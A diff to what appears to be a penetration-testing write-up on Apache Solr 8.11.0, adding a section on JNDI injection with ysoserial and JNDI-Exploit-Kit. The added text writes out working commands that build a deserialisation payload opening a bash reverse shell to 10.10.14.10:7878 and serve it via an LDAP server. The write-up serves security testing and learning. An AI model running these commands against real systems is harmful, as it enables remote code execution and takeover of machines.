@@ -53,6 +53,21 @@ The presence of `Apache Solr 8.11.0` on a machine can be confirmed through nmap 
 Ysoserial is a widely recognised exploitation tool specifically crafted to test the security of Java applications against serialisation vulnerabilities. It helps generate payloads that exploit these vulnerabilities, making it an essential tool for attackers and penetration testers who aim to assess and exploit applications that use Java serialisation.
 
 To use Ysoserial, an attacker would typically generate a payload with a command such as `java -jar ysoserial.jar [payload type] '[command to execute]'`, where `[payload type]` is the type of exploit and `[command to execute]` is the arbitrary command they wish to run on the target system. For example, using the `CommonsCollections1` payload type might look like this: `java -jar ysoserial.jar CommonsCollections1 'calc.exe'`. This command generates a serialised object that will execute the specified command when deserialised by a vulnerable application. Ysoserial is available for download on GitHub.
+
+RCE - JNDI-Injection-Exploit-Plus
+https://github.com/cckuailong/JNDI-Injection-Exploit-Plus is another tool for generating workable JNDI links and provide background services by starting RMI server,LDAP server and HTTP server.\
+
+RCE - ysoserial & JNDI-Exploit-Kit
+This option is useful against applications on Java versions configured to trust only specified classes. ysoserial generates serialized graphs of trusted classes that can act as gadgets for arbitrary code execution; the target application must have the gadget class used by ysoserial on its classpath.
+
+Using ysoserial or ysoserial-modified you can create the deserialization exploit that will be downloaded by JNDI:
+
+# Rev shell via CommonsCollections5
+java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
+Use JNDI-Exploit-Kit to generate JNDI links where payloads wait for connections from vulnerable machines. The kit can serve its automatically generated exploits or custom deserialization payloads generated manually or with ysoserial.
+
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
+
 -->
 
 ### How to Mitigate the Vulnerability
